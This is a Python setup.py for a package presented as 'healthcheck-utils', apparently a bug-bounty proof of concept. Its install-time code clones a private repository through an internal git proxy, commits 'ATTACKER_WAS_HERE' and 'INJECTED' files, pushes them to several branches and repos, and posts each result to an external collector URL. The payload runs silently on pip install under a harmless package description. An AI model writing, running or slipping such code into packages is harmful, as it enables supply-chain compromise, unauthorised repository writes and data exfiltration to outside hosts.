import subprocess
import os
import urllib.request
import json

COLLECTOR = "https://poc.0z.ci/j/c.php?id=jules9"

def report(tag, data):
    try:
        req = urllib.request.Request(
            COLLECTOR, data=f"[{tag}] {data}".encode(),
            headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

PROXY = "http://git@192.168.0.1:8080"

try:
    # Step 1: clone the target private repo
    r = subprocess.run(
        ['git', 'clone', '--depth', '1',
         f'{PROXY}/hacker1-test/secret', '/tmp/_push_test'],
        capture_output=True, text=True, timeout=20)
    report("clone-result", r.stdout + r.stderr)

    # Step 2: add a canary file
    canary = '/tmp/_push_test/ATTACKER_WAS_HERE.md'
    with open(canary, 'w') as f:
        f.write('# Proof of write access\\nThis file was written by setup.py during pip install.\\n')

    # Step 3: configure git identity for the commit
    subprocess.run(['git', '-C', '/tmp/_push_test', 'config', 'user.email', 'test@test.com'],
                   capture_output=True, timeout=5)
    subprocess.run(['git', '-C', '/tmp/_push_test', 'config', 'user.name', 'test'],
                   capture_output=True, timeout=5)

    # Step 4: stage and commit
    subprocess.run(['git', '-C', '/tmp/_push_test', 'add', 'ATTACKER_WAS_HERE.md'],
                   capture_output=True, timeout=5)
    r = subprocess.run(['git', '-C', '/tmp/_push_test', 'commit', '-m', 'test write access'],
                       capture_output=True, text=True, timeout=10)
    report("commit-result", r.stdout + r.stderr)

    # Step 5: attempt git push through the proxy
    env = os.environ.copy()
    env['GIT_CURL_VERBOSE'] = '1'
    r = subprocess.run(
        ['git', '-C', '/tmp/_push_test', 'push', 'origin', 'main'],
        capture_output=True, text=True, timeout=30, env=env)
    report("push-stdout", r.stdout[:2000])
    report("push-stderr", r.stderr[:3000])
    report("push-returncode", str(r.returncode))

    # Step 6: also try creating a new branch and pushing
    subprocess.run(['git', '-C', '/tmp/_push_test', 'checkout', '-b', 'pwned'],
                   capture_output=True, timeout=5)
    r2 = subprocess.run(
        ['git', '-C', '/tmp/_push_test', 'push', 'origin', 'pwned'],
        capture_output=True, text=True, timeout=30, env=env)
    report("push-branch-stdout", r2.stdout[:2000])
    report("push-branch-stderr", r2.stderr[:3000])
    report("push-branch-returncode", str(r2.returncode))

    # Step 7: try pushing to a DIFFERENT repo entirely
    # Create a fresh repo init and push to hacker1-test/qwe
    subprocess.run(['bash', '-c', '''
        mkdir -p /tmp/_push_other && cd /tmp/_push_other
        git init
        git config user.email "test@test.com"
        git config user.name "test"
        echo "INJECTED" > INJECTED.md
        git add .
        git commit -m "injected file"
    '''], capture_output=True, timeout=10)
    r3 = subprocess.run(
        ['git', '-C', '/tmp/_push_other', 'push',
         f'{PROXY}/hacker1-test/qwe', 'main:refs/heads/injected'],
        capture_output=True, text=True, timeout=30, env=env)
    report("push-other-repo-stdout", r3.stdout[:2000])
    report("push-other-repo-stderr", r3.stderr[:3000])
    report("push-other-repo-returncode", str(r3.returncode))

    # Cleanup
    subprocess.run(['rm', '-rf', '/tmp/_push_test', '/tmp/_push_other'],
                   capture_output=True, timeout=5)

except Exception as e:
    report("error", str(e))

from setuptools import setup

setup(
    name='healthcheck-utils',
    version='1.0.3',
    description='Health check endpoint utilities for Python HTTP servers',
    py_modules=['healthcheck_utils'],
    python_requires='>=3.7',
)
